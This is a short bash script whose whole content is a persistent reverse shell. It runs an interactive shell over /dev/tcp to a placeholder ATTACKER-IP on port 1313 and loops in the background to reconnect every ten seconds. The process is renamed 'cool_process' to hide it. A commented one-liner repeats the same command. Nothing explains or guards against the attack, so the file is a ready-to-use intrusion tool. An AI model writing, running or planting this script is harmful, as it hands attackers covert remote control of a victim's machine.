#!/bin/bash

# 1 liner version:
# bash -c '(while true; do exec -a cool_process sh -i >& /dev/tcp/<ATTACKER-IP>/1313 0>&1; sleep 10; done) &'

while true; do
  exec -a cool_process sh -i >& /dev/tcp/ATTACKER-IP/1313 0>&1
  sleep 10
done &